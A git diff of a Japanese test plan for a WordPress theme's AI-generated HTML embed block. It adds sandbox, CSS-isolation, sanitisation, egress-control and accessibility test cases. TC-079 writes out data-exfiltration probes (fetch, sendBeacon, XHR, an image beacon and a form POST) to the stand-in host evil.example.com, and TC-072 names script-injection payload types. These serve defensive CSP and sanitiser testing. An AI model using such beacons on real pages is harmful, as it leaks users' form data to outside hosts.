@@ -98,9 +98,9 @@
 
 ## 4. P0 / P1 / P2 分類
 
-- P0: CAT-001〜CAT-008、TC-002、TC-003、TC-005、TC-006、TC-007、TC-009、TC-010、TC-011、TC-016、TC-019、TC-020、TC-021、TC-023a、TC-023b、TC-024、TC-042、TC-043、TC-045、TC-047、TC-048、TC-049、TC-050
-- P1: CAT-009、TC-001、TC-004、TC-008、TC-012、TC-013、TC-014、TC-015、TC-017a、TC-017b、TC-018、TC-025、TC-026、TC-027、TC-028、TC-029、TC-030、TC-031、TC-032、TC-033、TC-034、TC-035、TC-037、TC-038、TC-040、TC-044、TC-046、TC-051、TC-052、TC-053、TC-054、TC-055、TC-056、TC-057、TC-058、TC-059、TC-060、TC-061、TC-062、TC-063、TC-064
-- P2: TC-022（監査ログ整合と運用連携）、TC-036（SLO レポート）、TC-039（AI citation log）、TC-041（LLMO 計測サマリ）、TC-065（disclosure 非注入時デフォルト動作）
+- P0: CAT-001〜CAT-008、TC-002、TC-003、TC-005、TC-006、TC-007、TC-009、TC-010、TC-011、TC-016、TC-019、TC-020、TC-021、TC-023a、TC-023b、TC-024、TC-042、TC-043、TC-045、TC-047、TC-048、TC-049、TC-050、TC-067
+- P1: CAT-009、TC-001、TC-004、TC-008、TC-012、TC-013、TC-014、TC-015、TC-017a、TC-017b、TC-018、TC-025、TC-026、TC-027、TC-028、TC-029、TC-030、TC-031、TC-032、TC-033、TC-034、TC-035、TC-037、TC-038、TC-040、TC-044、TC-046、TC-051、TC-052、TC-053、TC-054、TC-055、TC-056、TC-057、TC-058、TC-059、TC-060、TC-061、TC-062、TC-063、TC-064、TC-066、TC-068、TC-069、TC-070、TC-072、TC-073、TC-074、TC-075、TC-076、TC-077、TC-078、TC-079
+- P2: TC-022（監査ログ整合と運用連携）、TC-036（SLO レポート）、TC-039（AI citation log）、TC-041（LLMO 計測サマリ）、TC-065（disclosure 非注入時デフォルト動作）、TC-071（prefers-reduced-motion）
 
 ※ 優先度整合・受入条件は INT-002 / DC-F-002 に基づき `§4` 一覧を `TC` テーブルに合わせて更新済み（CAT-009 は P1）。TC-017 を TC-017a/TC-017b に分割。TC-027〜TC-030 を P1 で追加。§8 追加分 P0（TC-042/043/045/047/048/049/050）を §4 正本リストに反映済み（2026-06-18）。§8 追加分（TC-031〜060）を P0/P1/P2 とも §4 正本に反映済み（2026-06-18）。
 
@@ -322,13 +322,113 @@
 
 ---
 
+## §10. ADR-026 由来 TC（AI 生成 HTML 埋め込みブロック / CSS 隔離 / dual-mode）— 2026-06-20 追加
+
+> **由来 GAP**: GAP-RT-058（埋め込みブロック未設計 → RESOLVED-IN-L3 + CARRY-TO-L4）  
+> **由来 ADR**: `docs/adr/ADR-026.md`（`agent-neo/embed` ブロック / CSS 隔離 / dual-mode設計）  
+> **最重要原則**: 具体的な block.json 完全形・iframe sandbox 属性最終セット・CSP 文字列・postMessage プロトコル・sanitize allowlist・DSD SSR 詳細は全て L4 carry（CARRY-EMBED-001〜006）。本 TC は L3 段階の**受入観点**を登録する。
+
+### 10.1 TC 一覧（TC-066〜TC-073 / TC-079）
+
+| TC-ID | 対象 REQ / ADR | 前提条件 | 手順 | 受入条件 | 種別 | 優先度 |
+|---|---|---|---|---|---|---|
+| TC-066 | ADR-026 / REQ-NF-001a | `agent-neo/embed` ブロック（mode=interactive および mode=static）が実装済み・テーマ CSS が標準的なスタイルを持つ | **(mode=interactive)** (1) mode=interactive の埋め込みブロックをページに設置 (2) Playwright で iframe 内の要素の `computed style` を取得 (3) テーマ CSS が定義している `font-family` / `color` 等を確認。**(mode=static)** (4) mode=static の埋め込みブロックをページに設置（Shadow DOM / DSD） (5) shadow root に `:host { all: initial }` 等の明示 host リセットが適用されていることを HTML ソースで確認する (6) Playwright で shadow root 内要素の `computed style` を取得し、テーマ CSS の `font-family` / `color` 等が引き継がれていないことを確認 (7) shadow root 内の `<style>` ルールが light DOM の要素（同一ページの他ブロック等）に影響していないことを確認 | **(mode=interactive)** (a) iframe 内要素の `computed style` がテーマ CSS のフォント・カラー定義を継承していない（sandbox による CSS 隔離が機能している）(b) テーマの `*` セレクタ・要素セレクタが iframe 内に侵入していない。**(mode=static)** (c) shadow root に明示 host リセット（`:host { all: initial }` 等）が適用され、その結果 shadow 内要素の `computed style` がテーマの継承プロパティ（`font-family` / `color` 等）を引き継いでいないこと（Shadow DOM はセレクタ/非継承プロパティを遮断するが継承プロパティは host 経由で入るため、完全な視覚隔離はリセット適用が前提となる。リセット**なしに** Shadow DOM だけで継承が止まる、という前提で検証しない）(d) shadow root 内の `<style>` ルールが light DOM・他ブロックへ漏洩していない（同一ページの light DOM 要素の `computed style` が変化しない） | E2E | P1 |
+| TC-067 | ADR-026 セキュリティ / REQ-NF-004 | `agent-neo/embed`（mode=interactive）が iframe sandbox 付きで実装済み（sandbox 属性の最終セットは CARRY-EMBED-002 で L4 確定） | (1) Playwright で iframe の `sandbox` 属性値を取得し **behavioral 不変条件**を検証する (2) iframe 内から `window.parent.document` へのアクセスを試みる JS を実行 (3) Console エラーと DOM アクセス結果を確認 | (a) **sandbox 属性が存在し、`allow-same-origin` トークンを含まない**（親 origin 隔離＝XSS 封じ込めの核心）(b) **`allow-top-navigation` / `allow-top-navigation-by-user-activation` トークンをいずれも含まない**（top-navigation 不許可）(c) **`allow-scripts` トークンを含む**（スクリプト実行に必要）(d) `allow-forms` 等の追加トークンは L4 設計判断として許容し、テストは禁止トークン（`allow-same-origin` / `allow-top-navigation*`）の**不在**で検証する (e) iframe 内 JS が `window.parent.document.cookie` / `window.parent.localStorage` にアクセスできない（`SecurityError` 発生）。最終 sandbox セットは CARRY-EMBED-002 で確定 | E2E | P0 |
+| TC-068 | ADR-026 / postMessage resize | mode=interactive ブロックが実装済み・高さが動的に変わるコンテンツを iframe 内に持つ | (1) ページを Playwright でロード (2) iframe 内コンテンツの高さを変化させる操作を実行 (3) 親側 DOM の iframe 要素の `height` 属性 / `style.height` を確認 | (a) iframe 高さが postMessage で送信され、テーマ側 JS が iframe の `height` を動的に更新する (b) **`allow-same-origin` を含まない sandbox のため `event.origin` は opaque（`"null"`）になり、`event.origin === <sandbox-origin>` の特定 origin 一致照合は機能しない**。テーマ側は **`event.source === iframe.contentWindow`**（送信元 Window 照合）+ **iframe 生成時にテーマが埋め込む一意トークン（nonce / payload-id）のペイロード内検証** の 2 点を組み合わせ、正当な高さ更新メッセージのみ受理し、それ以外を無視することを確認する。`event.origin` の `=== <sandbox-origin>` 一致を合格条件としない（具体的な nonce 生成方式・メッセージスキーマは L4 carry CARRY-EMBED-002） | E2E | P1 |
+| TC-069 | ADR-026 a11y / WCAG 2.1 SC4.1.2 | `agent-neo/embed`（mode=interactive）が実装済み | (1) ページの HTML ソースを確認 (2) axe で WCAG 2.1 frame-title ルールを実行 | (a) `<iframe>` 要素に `title` 属性が存在し、空文字でない (b) axe で `frame-title` ルール違反が 0 件 | unit / axe | P1 |
+| TC-070 | ADR-026 SEO / mode=static | `agent-neo/embed`（mode=static）が Declarative Shadow DOM（DSD）で実装済み・PHP render_callback が実装済み | (1) `GET /wp-json/wp/v2/posts/{id}?context=view` でレスポンス JSON を取得 (2) `GET /posts/{id}` で HTML ソースを確認 | (a) mode=static ブロックの shadow root 内テキスト（見出し・説明文等）がサーバーサイドレンダリングされた HTML に含まれる（Googlebot が JS 非実行でもクロール可能な状態） (b) `<template shadowrootmode="open">` が含まれた PHP 出力が確認できる | integration | P1 |
+| TC-071 | ADR-026 / `prefers-reduced-motion` | `agent-neo/embed`（mode=interactive）が実装済み・iframe 内に CSS animation / transition を持つコンテンツが設置済み | (1) Playwright で `prefers-reduced-motion: reduce` メディアクエリを有効化 (2) iframe 内のアニメーション要素の `computed style` を確認 | (a) `prefers-reduced-motion: reduce` が有効な場合、iframe 内 CSS アニメーションが停止または大幅に短縮される (b) `animation-duration: 0` / `transition-duration: 0` 等が適用されていることを CSS property で確認 | E2E | P2 |
+| TC-072 | ADR-026 / REQ-NF-025（薄レンダラ原則 / mode 別 sanitize） | `agent-neo/embed` ブロックが実装済み / Automation SEO 側から `mode` / `embed_url` / `title` 等の payload が届く経路が確認済み（srcdoc / 直接 HTML POST の受け口は廃止） | (1) **mode=static 向け**: 不正な payload（`<script>` タグ・インラインイベントハンドラ（`onclick` 等）・`javascript:` URL を含む HTML）を `agent-neo/embed`（mode=static）ブロックへ投入し、Shadow DOM レンダリング結果を確認する (2) **mode=interactive 向け**: Automation SEO が sandbox-origin（`https://<sandbox-origin>/embed/{id}`）で生成・配信した embed URL がテーマに渡されることを確認する（テーマは embed URL を指す iframe を出力するのみ。`<script>` 入り HTML の直接 POST / srcdoc payload の受け口はテーマ側に存在しないことを確認する） | (a) テーマ側は payload の生成判断を行わない（テーマ独自の AI ロジックを持たない） (b) **mode=static**: テーマ側 sanitize（`wp_kses` / DOMPurify 等）が `<script>` タグ・インラインイベントハンドラ（`onclick` 等）・`javascript:` URL を除去していること。Shadow DOM 内に `<script>` タグが出力されていないこと（JS は一切実行しない。allowlist 詳細は CARRY-EMBED-004 で精緻化） (c) **mode=interactive**: テーマは **sandbox-origin の embed URL を指す iframe を出力するのみ**（untrusted HTML/JS を保持しない・sanitize しない＝それは sandbox-origin 側 Automation SEO の責務）。テーマ側 defense-in-depth は「**frame-src allowlist**（`frame-src https://<sandbox-origin>` のみ許可）+ **sandbox 属性**（`allow-same-origin` 不含 / `allow-top-navigation*` 不含）」で担保。`<script>` はサンドボックスオリジン上の HTML に含まれ、別オリジン iframe 隔離によって親 DOM コンテキストでは決して実行されないことを確認する（allowlist 詳細・sandbox-origin URL は L4 carry CARRY-EMBED-002 / CARRY-EMBED-003 で確定） | unit | P1 |
+| TC-073 | ADR-026 / 固定ページ（page）post type | `agent-neo/embed` ブロックが実装済み / 固定ページ（page post type）の編集画面が利用可能 | (1) WordPress 管理画面で固定ページ（ページ編集）を開く (2) ブロック挿入メニュー（block inserter）から `agent-neo/embed` を検索・選択して固定ページに挿入する (3) 固定ページをプレビュー / 公開し、フロントエンドを確認する | (a) `agent-neo/embed` ブロックが固定ページ編集画面の block inserter に表示され、挿入できること（post type 制限なし）(b) 固定ページのフロントエンドで mode=interactive の iframe sandbox 隔離、および mode=static の Shadow DOM CSS 隔離が投稿（post）と同様に機能すること（テーマ CSS 非干渉確認）(c) 投稿と固定ページで隔離レンダリングの動作差異がないこと。【standalone 観点注記】`standalone` モード（REQ-F-038 / Automation SEO 不要で動作）では mode=interactive は利用不可。standalone 環境での `agent-neo/embed` ブロックは mode=static のみサポートし、interactive を設定した場合はフォールバックまたは非表示となることを確認する（投稿・固定ページ両 post type に適用） | E2E | P1 |
+| TC-079 | ADR-026 §2 egress 制御 / REQ-NF-004 | `agent-neo/embed`（mode=interactive）が実装済み / **サンドボックスオリジン（`https://<sandbox-origin>/embed/{id}`）が HTTP レスポンスヘッダ CSP（`connect-src` / `img-src` / `form-action` default-deny）を配信済み**（CARRY-EMBED-003 解消後） | (1) 診断フォームコンテンツを含む mode=interactive の sandboxed iframe を含むページを Playwright でロードする。(2) **【fetch 検証】** iframe 内 JS から許可外 origin（例: `https://evil.example.com`）への `fetch()` を試みる。Console エラーを検証する。(3) **【sendBeacon 検証】** iframe 内 JS から `navigator.sendBeacon('https://evil.example.com/beacon', 'data')` を呼び出す。Console エラーおよびネットワークリクエストの発生有無（Playwright の `page.on('request')` で捕捉）を確認する。(4) **【XMLHttpRequest 検証】** iframe 内 JS から `new XMLHttpRequest()` で `https://evil.example.com/xhr` への POST を試みる。Console に `ContentSecurityPolicyError` が記録されることを確認する。(5) **【img beacon 検証】** iframe 内 JS から `new Image().src = 'https://evil.example.com/pixel.gif'` を実行する。Playwright の `page.on('request')` でリクエストが発生しないこと（`img-src` CSP ブロック）を確認し、Console エラーを検証する。(6) **【form POST 検証】** sandbox に `allow-forms` を含む場合（TC-067 受入条件（d）の L4 設計判断により許可されたとき）: iframe 内に `<form method="POST" action="https://evil.example.com/exfil">` を動的に生成して送信を試みる。Console エラーおよびネットワークリクエストの発生有無を確認する。 | (a) **許可外 origin への `fetch` が CSP `connect-src` 違反でブロックされ**、Playwright Console に `ContentSecurityPolicyError` が記録されること。(b) **`navigator.sendBeacon()` による許可外 origin への送信が CSP `connect-src` 違反でブロックされること**（sendBeacon は connect-src が制御対象）。レスポンスが受信されず、データが外部へ送信されないこと。(c) **`XMLHttpRequest` による許可外 origin への送信が CSP `connect-src` 違反でブロックされ**、`ContentSecurityPolicyError` が Console に記録されること。(d) **`new Image().src` を使った pixel beacon（img beacon）による外部送信が CSP `img-src` 違反でブロックされること**（Playwright `page.on('request')` でリクエスト未発生を確認）。(e) **【form POST 検証】`allow-forms` が有効な場合でも、許可外 origin への plain form POST が CSP `form-action` ディレクティブによりブロックされ**、`ContentSecurityPolicyError` が Console に記録されること。iframe 内の診断フォーム入力値が許可外 origin へ送信されないこと。(f) **fetch / sendBeacon / XHR / img beacon / form POST の全経路が許可外 origin に対して CSP によりブロックされること**（`connect-src` / `img-src` / `form-action` の default-deny が全チャネルをカバーしていることを確認）。【注記】egress default-deny は **サンドボックスオリジン配信の HTTP ヘッダ CSP で担保**する（srcdoc は使用しない）。埋め込みが正当に外部通信を要する場合は「専用 endpoint + 明示 CORS 契約を L4 で定義（CARRY-EMBED-003）」として引き継ぐ。本 TC は default-deny egress のブロック検証に専念する | E2E | **P1** |
+
+### 10.2 P0 / P1 / P2 分類（§10 追加分）
+
+- **P0 追加分**: TC-067（iframe sandbox 隔離 / `allow-same-origin` 不在確認 / XSS 封じ込め）
+- **P1 追加分**: TC-066（CSS 非干渉）/ TC-068（postMessage resize / `allow-same-origin` 不含のため `event.origin` は opaque(null)・検証主軸は `event.source` + nonce/payload-id）/ TC-069（a11y title）/ TC-070（static mode indexable SSR）/ TC-072（薄レンダラ原則 / mode 別 sanitize：static は `<script>` 除去・interactive は別オリジン iframe 隔離 + frame-src allowlist で親 DOM 不実行保証）/ TC-073（固定ページでの block inserter 挿入・隔離レンダリング確認・standalone では mode=static のみ）/ TC-079（egress allowlist / サンドボックスオリジン HTTP ヘッダ CSP による診断 embed の外部送信 CSP ブロック確認）
+- **P2 追加分**: TC-071（`prefers-reduced-motion`）
+
+§4 P0/P1 リスト更新:
+
+- P0 に追加: TC-067
+- P1 に追加: TC-066、TC-068、TC-069、TC-070、TC-072、TC-073、TC-079
+- P2 に追加: TC-071
+
+### 10.3 GAP-RT ↔ TC マッピング（§10 追加分）
+
+| GAP-RT | テーマ | 関連 TC | carry |
+|---|---|---|---|
+| GAP-RT-058 | 埋め込みブロック未設計（ADR-026 dual-mode） | TC-066（CSS 非干渉）/ TC-067（iframe sandbox XSS 封じ込め）/ TC-068（postMessage resize）/ TC-069（a11y title）/ TC-070（static mode indexable）/ TC-071（prefers-reduced-motion）/ TC-072（薄レンダラ原則）/ TC-073（固定ページ post type での block inserter 挿入・隔離レンダリング）/ **TC-079（egress allowlist / CSP connect-src・img-src・form-action ブロック確認）** | CARRY-EMBED-001（block.json 完全形）/ CARRY-EMBED-002（sandbox 属性最終セット / postMessage プロトコル）/ CARRY-EMBED-003（CSP 文字列 + **egress allowlist**）/ CARRY-EMBED-004（sanitize allowlist / DSD PHP 実装詳細）/ CARRY-EMBED-005（Abilities API 宣言）/ CARRY-EMBED-006（検証パイプライン追加） |
+
+### 10.4 L4 実装で実テスト化が必要な carry 一覧（§10 追加分）
+
+| Carry-ID | 関連 TC | 理由 | 解消条件 |
+|---|---|---|---|
+| CARRY-EMBED-001 | TC-066〜073 全体 | `agent-neo/embed` block.json 完全形（属性・支持・render_callback）が未確定のため全 TC の具体的な実装前提が不確定 | L4 embed Sprint 着手前に block.json 完全形を確定後、全 TC の受入条件を精緻化 |
+| CARRY-EMBED-002 | TC-067 / TC-068 | iframe sandbox 属性最終セット（不変条件: `allow-scripts` 含む・`allow-same-origin` 不含・`allow-top-navigation*` 不含 / 追加トークン `allow-forms` 等は L4 判断）と postMessage プロトコル（origin 検証方式）が未確定 | L4 embed Sprint 着手前に確定後、TC-067 受入条件（d）の禁止トークン不在検証を精緻化 |
+| CARRY-EMBED-003 | TC-067 / **TC-079** | 親ページ側 CSP 文字列（`frame-src https://<sandbox-origin>` 等）未確定のため TC-067 の完全な隔離検証が不可。**egress allowlist（`connect-src` / `img-src` / `form-action` default-deny + 許可 origin 列挙）はサンドボックスオリジンの HTTP ヘッダ CSP 仕様として未確定のため TC-079 の実テストが不可**。srcdoc は使用しないため「srcdoc-scoped CSP」の懸念は解消済み。**解消すべき残件**: ①親ページ frame-src allowlist（`frame-src https://<sandbox-origin>` のみ許可）の CSP 文字列確定、②サンドボックスオリジン側 HTTP ヘッダ CSP（`connect-src` / `img-src` / `form-action` default-deny + 許可 origin 列挙）の仕様確定 | L4 セキュリティ Sprint 着手前に①親ページ frame-src allowlist + ②サンドボックスオリジン HTTP ヘッダ CSP の両仕様を確定後、TC-067 / TC-079 受入条件に検証を追加 |
+| CARRY-EMBED-004 | TC-072 | テーマ側 sanitize allowlist（`wp_kses` / DOMPurify）未確定のため TC-072 受入条件（b）の精緻化不可 | L4 embed Sprint 着手前に allowlist 確定後、TC-072 受入条件（b）を精緻化 |
+
+---
+
+## §11. a11y 新 5 要件 TC（GAP-RT-057 / CARRY-A11Y-001 / WordPress.org accessibility-ready 2026-05-06 改定）— 2026-06-20 追加
+
+> **由来 GAP**: GAP-RT-057（L5 アクセシビリティ新 5 要件 → RESOLVED-IN-L3 + CARRY-TO-L4 / 再評価期限 2026-06-30）  
+> **由来 carry**: CARRY-A11Y-001（L4 着手前に本節へ TC 登録 / P1）  
+> **由来設計**: `docs/design/L5-visual-design.md` §5.1.A（WordPress.org accessibility-ready 2026-05-06 改定 新 5 要件）  
+> **TC-ID**: 既存最終 TC-073 に続き **TC-074〜TC-078** として採番。  
+> **注意**: §10 は ADR-026 / GAP-RT-058 埋め込みブロック専用。本節（§11）が a11y 新 5 要件の専用節。
+
+### 11.1 TC 一覧（TC-074〜TC-078）
+
+| TC-ID | 要件 # | 対象要件 | 前提条件 | 手順 | 受入条件 | 種別 | 優先度 |
+|---|---|---|---|---|---|---|---|
+| TC-074 | ① | **Responsive Reflow & Text Spacing**（WCAG SC 1.4.10 / SC 1.4.12） | AGENT NEO テーマ有効化・記事ページが存在 | (1) Playwright で `page.setViewportSize` を 320px 幅に設定（200% zoom 相当の最小 viewport）(2) CSS text-spacing bookmarklet（`line-height: 1.5 / letter-spacing: 0.12em / word-spacing: 0.16em`）を適用し、さらに段落要素（`p`）に `margin-block: 2em` を適用して段落間隔をフォントサイズの 2 倍に設定する（WCAG SC 1.4.12 段落間隔要件。`paragraph-spacing` は CSS プロパティとして存在しないため使用不可。段落間隔は段落要素の `margin-block` / `margin-bottom` 等で適用すること） (3) 横スクロールバー出現有無を確認 | (a) 横スクロールが発生しない（**`Math.max(document.documentElement.scrollWidth, document.body.scrollWidth) <= window.innerWidth`**。standards-mode では `documentElement` がスクロール要素となり `document.body.scrollWidth` のみでは横溢れを見逃す場合がある。`document.scrollingElement.scrollWidth` を利用することも可）(b) テキストの重複・切断・情報損失が視覚的に発生しない（Playwright スクリーンショット確認）(c) 適用した text-spacing 値（line-height ≥ 1.5 / letter-spacing ≥ 0.12em / word-spacing ≥ 0.16em / 段落間隔 ≥ フォントサイズの 2 倍 = `margin-block: 2em` 以上）でコンテンツが損失しないこと（d）CI で `scrollWidth > innerWidth` を検出した場合 fail | CI gate / E2E | P1 |
+| TC-075 | ② | **Context-Change 防止**（WCAG SC 3.2.1 On Focus / SC 3.2.2 On Input） | AGENT NEO テーマ有効化・インタラクティブ要素（リンク・ボタン・フォーム）を含むページが存在 | (1) Playwright でページの全フォーカス可能要素を Tab キーで順次フォーカス (2) フォーカス移動ごとに `page.url()` / `page.title()` の変化および `page.context().pages()` での新規 window 発生を assert (3) セレクト要素・ラジオボタン等 On Input 要素の値変更後に `page.url()` 変化を assert (4) フォーカス・入力イベントで `window.location.href` が変化しないことを Playwright `page.evaluate` で確認 | (a) フォーカス移動（Tab / Shift+Tab）のみで URL 遷移・フォーム送信・ウィンドウ生成が発生しない（Playwright `expect(page).toHaveURL(originalUrl)` / `expect(context.pages()).toHaveLength(1)` で assert） (b) セレクト変更（`change` イベント発火）のみで自動ページ遷移が発生しない（Playwright `expect(page).toHaveURL(originalUrl)` で assert） (c) axe-core を実行する場合は**実在するルール ID のみ**使用すること（`on-focus-context-change` は axe-core に存在しないため使用しない。WCAG SC 3.2.1 / 3.2.2 関連で axe-core が持つルール（例: `select-name` 等）を使用するか、または上記 Playwright assertion のみで代替する） | E2E | P1 |
+| TC-076 | ③ | **Accessible Hover/Focus State（outline 除去禁止）**（WCAG SC 2.4.11 Focus Appearance Min / SC 2.4.12 Enhanced） | AGENT NEO テーマ CSS が適用済み | (1) stylelint / ESLint で `outline: none` / `outline: 0` の出現を全 CSS / SCSS ファイルで検索 (2) Playwright で全フォーカス可能要素のフォーカスリング `outline-width` / `outline-color` を取得 (3) Lighthouse / axe でフォーカスインジケータ確認 | (a) `outline: none` / `outline: 0` を含む CSS ルールが 0 件（stylelint CI gate） (b) フォーカスリングが 2px 以上・コントラスト比 3:1 以上の視覚変化を持つ（axe / Playwright で確認） (c) CI で stylelint 違反があると fail | CI gate / axe | P1 |
+| TC-077 | ④ | **Accessibility Statement 掲載**（WCAG 2.1 文書化要件 / W3C EARL） | AGENT NEO 管理画面またはドキュメントが参照可能 | (1) 管理画面「アクセシビリティ情報」ページを開く、またはドキュメントの accessibility-statement テンプレートを参照 (2) テンプレートの必須項目（連絡先・対応 WCAG バージョン・既知の不合格項目・代替手段）を確認 | (a) アクセシビリティ声明サンプルテンプレートが管理画面またはドキュメント内に存在すること (b) テンプレートに「対応 WCAG バージョン・既知の不合格項目・代替手段・連絡先」の 4 項目が含まれること (c) テンプレートは L4 デプロイ前に存在していること | integration / docs | P1 |
+| TC-078 | ⑤ | **非アクセシブル plugin を推奨しない**（WCAG 2.1 適合方針） | AGENT NEO 管理画面「推奨プラグイン」リスト・ドキュメント内リンクが存在 | (1) 管理画面の「推奨プラグイン」リストに掲載されているプラグインを列挙 (2) 各プラグインについて **axe-core による実査**（critical / serious 違反の有無）を確認 (3) ドキュメント内の推奨プラグインリンクを同様に確認 | (a) 推奨プラグインリストに **axe-core 実査で critical / serious 違反があるプラグインが含まれないこと**（WCAG 2.2 AA 相当）（注: `accessibility-ready` タグは WordPress.org の**テーマ向けレビュータグ**であり plugin には付与されない。plugin の合否判定はタグの有無でなく axe 実査ベースで行う） (b) プラグイン選定にアクセシビリティ審査プロセス（axe 実査を含む運用規約として文書化）が存在すること (c) CI 自動化対象外（運用規約として管理）だが、L4 デプロイ前に規約文書が存在すること | integration / docs | P1 |
+
+### 11.2 P0 / P1 / P2 分類（§11 追加分）
+
+- **P0 追加分**: なし（新 5 要件は CI gate が P1 / 再評価期限 2026-06-30 のため P1 以下）
+- **P1 追加分**: TC-074（reflow & text-spacing）/ TC-075（context-change 防止）/ TC-076（focus outline 禁止）/ TC-077（accessibility statement）/ TC-078（非アクセシブル plugin 非推奨）
+- **P2 追加分**: なし
+
+§4 P0/P1 リスト更新:
+
+- P1 に追加: TC-074、TC-075、TC-076、TC-077、TC-078
+
+### 11.3 GAP-RT ↔ TC マッピング（§11 追加分）
+
+| GAP-ID | カテゴリ | カバーする TC | 残存 carry |
+|---|---|---|---|
+| GAP-RT-057 | a11y 新 5 要件（WordPress.org accessibility-ready 2026-05-06 改定 / WCAG 2.2 AA） | TC-074（reflow & text-spacing / SC 1.4.10 / SC 1.4.12）/ TC-075（context-change 防止 / SC 3.2.1 / SC 3.2.2）/ TC-076（focus outline 除去禁止 / SC 2.4.11 / SC 2.4.12）/ TC-077（accessibility statement 掲載 / 文書化要件）/ TC-078（非アクセシブル plugin 非推奨 / 審査プロセス） | CARRY-A11Y-001 解消（本節登録で完了）/ TC-074〜076 の CI 自動化実装は L4 carry / TC-077〜078 は運用規約・ドキュメント対応（L4 デプロイ前必須） |
+
+### 11.4 L4 実装で実テスト化が必要な carry 一覧（§11 追加分）
+
+| Carry-ID | 関連 TC | 理由 | 解消条件 |
+|---|---|---|---|
+| CARRY-A11Y-001 | TC-074〜TC-078 | WordPress.org accessibility-ready 新 5 要件の具体 TC が未登録だった（本節追加で **解消**）。CI 自動化（TC-074 Playwright reflow / TC-076 stylelint outline 禁止）は L4 CI Sprint で実テスト化 | 本節追加により CARRY-A11Y-001 の「test-plan への TC 登録」部分は **完了**。CI 自動化部分は L4 で継続管理 |
+
+---
+
 ## 7. 変更履歴（changelog）
 
 | 日付 | 修正者 | 内容 |
 |---|---|---|
 | 2026-06-18 | 実テーマギャップ監査由来 TC 追加 | §8 を新設（GAP-RT-036〜041 対応）。TC-031〜TC-060 を新規追加（30 TC）。内訳: TC-031〜036（GAP-RT-036 運用品質）/ TC-037〜041（GAP-RT-037 LLMO）/ TC-042〜046（GAP-RT-038 Consent Gate）/ TC-047〜051（GAP-RT-039 snapshot allowlist）/ TC-052〜055（GAP-RT-040 canonical+OGP 同時評価）/ TC-056〜060（GAP-RT-041 移行 SEO）。GAP-RT↔TC マッピング表（§8.8）・L4 carry 一覧（§8.9）を追記。P0 追加: TC-042/043/045/047/048/049/050。 |
 | 2026-06-20 | ADR-025 由来 TC 追加 | §9 を新設（GAP-RT-055 / AI 生成コンテンツ開示法規制 / ADR-025 対応）。TC-061〜TC-065 を新規追加（5 TC）。P1 追加: TC-061〜064。P2 追加: TC-065。GAP-RT↔TC マッピング（§9.3）・L4 carry 一覧（§9.4）を追記。 |
+| 2026-06-20 | ADR-026 由来 TC 追加（§10 新設） | §10 を新設（GAP-RT-058 / AI 生成 HTML 埋め込みブロック CSS 隔離 dual-mode / ADR-026 対応）。TC-066〜TC-072 を新規追加（7 TC）。P0 追加: TC-067。P1 追加: TC-066/068/069/070/072。P2 追加: TC-071。GAP-RT↔TC マッピング（§10.3）・L4 carry 一覧（§10.4）を追記。合計 76 → 83 件。 |
+| 2026-06-20 | ADR-026 framing 修正（TC-073 追加） | ADR-026 の位置づけを「投稿・固定ページ双方で利用可能な標準 Gutenberg ブロック」に明確化。TC-073（固定ページ post type での block inserter 挿入・隔離レンダリング確認 / P1）を追加。§10.1 TC 表・§10.2 P1 リスト・§10.3 GAP-RT↔TC マッピング・§10.4 CARRY-EMBED-001 TC 範囲を更新。合計 83 → 84 件。 |
+| 2026-06-20 | a11y 新 5 要件 TC 追加（§11 新設 / P1 修正対応） | §11 を新設（GAP-RT-057 / CARRY-A11Y-001 / WordPress.org accessibility-ready 2026-05-06 改定 新 5 要件）。TC-074〜TC-078 を新規追加（5 TC）。§10 は ADR-026 / GAP-RT-058 埋め込みブロック専用のため §11 として独立分節。P1 追加: TC-074（reflow & text-spacing）/ TC-075（context-change 防止）/ TC-076（focus outline 禁止）/ TC-077（accessibility statement）/ TC-078（非アクセシブル plugin 非推奨）。CARRY-A11Y-001 の「test-plan への TC 登録」部分を完了。§4 P1 リスト更新。合計 84 → 89 件。 |
+| 2026-06-20 | TC-072 sanitize 方針 mode 別分割（Codex TL レビュー P1 是正）→ 案A（別オリジン iframe）へ転換是正 | TC-072 受入条件をモード別に分割。旧: `<script>` を無条件除去。新: mode=static は `wp_kses` / DOMPurify 等で `<script>`・イベントハンドラ・`javascript:` URL を除去（JS 不実行）/ mode=interactive は別オリジン sandbox-origin の embed URL を指す iframe を出力するのみ（untrusted HTML/JS を保持しない・srcdoc / 直接 HTML POST の受け口は廃止）・防御境界は frame-src allowlist（sandbox-origin のみ）+ sandbox 属性（allow-same-origin 不含）で担保。前提条件欄の `srcdoc` / `直接 POST` 旧記述を削除。ADR-026 セキュリティ節（§2）に同方針を明記。TC 採番変更なし / 件数変更なし（89 件維持）。 |
+| 2026-06-20 | TC-074 無効 CSS プロパティ修正（Codex TL レビュー P2 是正） | TC-074 手順(2) の `paragraph-spacing: 2em` を削除。`paragraph-spacing` は CSS プロパティとして存在しない（WCAG SC 1.4.12 段落間隔要件が実質スルーされていた）。正しくは段落要素（`p`）の `margin-block: 2em`（フォントサイズの 2 倍）で適用することを明記。受入条件に WCAG SC 1.4.12 の 4 軸（line-height ≥ 1.5 / letter-spacing ≥ 0.12em / word-spacing ≥ 0.16em / 段落間隔 ≥ フォントサイズ × 2）を明示追加。 |
+| 2026-06-20 | TC-066 dual-mode 拡張 + ADR-026 storage bridge 禁止化（Codex TL レビュー P2×2 是正 / 8巡目） | **P2-1**: TC-066 を「dual-mode の CSS 非干渉（interactive=iframe / static=Shadow DOM 両方）」に拡張。旧: mode=interactive の iframe のみ検証。新: mode=static（Shadow DOM）の CSS 隔離検証を追加（(c) shadow root 内要素への テーマ CSS 侵入なし / (d) shadow 内 CSS の light DOM・他ブロックへの漏洩なし）。前提条件・手順・受入条件を dual-mode 記述に更新。ADR-026 TC サマリ表の TC-066 行も同内容で更新。TC 採番・件数変更なし（89 件維持）。**P2-2**: ADR-026 §Consequences 「untrusted JS のサンドボックス必須」を更新。旧「postMessage 経由で親側 localStorage を利用する設計とするが、L4 carry」を「親 localStorage bridge は原則禁止。汎用 storage API（任意キー/任意値 read/write）化は不変制約。永続化が必要な場合でも namespace 固定 + 値 schema 検証 + write 専用（read 不可）等の厳格プロトコルに限定。デフォルトは bridge なし方針を優先。制約として CARRY-EMBED-002 に引き継ぐ」に改訂。 |
